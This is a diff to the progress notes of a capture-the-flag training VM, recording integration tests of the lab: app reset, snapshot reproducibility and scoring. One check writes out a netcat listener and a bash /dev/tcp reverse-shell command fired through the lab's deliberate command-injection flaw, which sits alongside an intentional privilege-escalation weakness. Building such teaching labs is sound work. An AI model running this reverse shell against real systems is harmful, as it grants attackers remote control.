@@ -44,7 +44,7 @@ application works (there is no application yet).
 - [x] Phase 4 — Flags & story (15 flags, encryption, manifest) — verified below
 - [x] Phase 5 — Privilege escalation — verified below
 - [x] Phase 6 — Documentation (player + instructor) — verified below
-- [ ] Phase 7 — Integration testing
+- [x] Phase 7 — Integration testing — verified below
 - [ ] Phase 8 — Packaging
 
 ## Phase 2 — Application (DONE, verified)
@@ -292,6 +292,39 @@ real inaccuracy found while reviewing:
   the intended path never gives players SSH access — they get a shell
   via the command-injection vulnerability itself. Corrected to describe
   setting up a listener instead.
+
+## Phase 7 — Integration testing (DONE)
+
+Ran every check in the project spec's Section 21 acceptance checklist
+(A-G) against the live VM in this session; full detail with evidence in
+`instructor-material/acceptance-test-report.md`. Highlights beyond what
+earlier phases already covered:
+
+- **A4 (app reset)**: stopped the service, deleted the sqlite DB,
+  re-ran `provision.sh` — re-seeded correctly, service restarted on a
+  new PID, health check passed.
+- **G2 (reproducible VM starting state)**: deliberately deleted
+  `original_flag_4.enc` and stopped the app service, took a
+  `qemu-img snapshot`, restored it, and confirmed both were back
+  exactly as before — plus the privesc weakness still correctly in
+  place and no leftover exploit artifacts. The resulting `clean-start`
+  snapshot is now the VM's actual baseline for resetting between teams.
+- **G4 (real reverse shell, not just a `sudo -u admin` proxy)**:
+  started `nc -lvnp 4444` on the host, triggered
+  `bash -i >& /dev/tcp/10.0.2.2/4444 0>&1` via the live command
+  injection — the listener genuinely caught the connection and dropped
+  into `admin@forgotten-admin:...$`. Confirms the host/guest IP
+  distinction documented in `vm/networking.md` (`10.0.2.2`, not
+  `127.0.0.1`) is actually correct, and that this specific player-facing
+  workflow — not just the underlying vulnerability — really works.
+- **E6**: functionally tested the scoring-guide.md snippet with a
+  genuine flag (100 pts), a decoy (0 pts), and junk input (not
+  recognized) — all three correct.
+
+All A-G checks: **PASS**. Two honest gaps remain, stated in the report:
+multi-host lab networking untested (only single-host loopback), and
+Section G3 (no accidental shortcut) is a reasoned check of the
+implemented surface, not an exhaustive penetration test.
 
 ## Outstanding items requiring the project owner
 
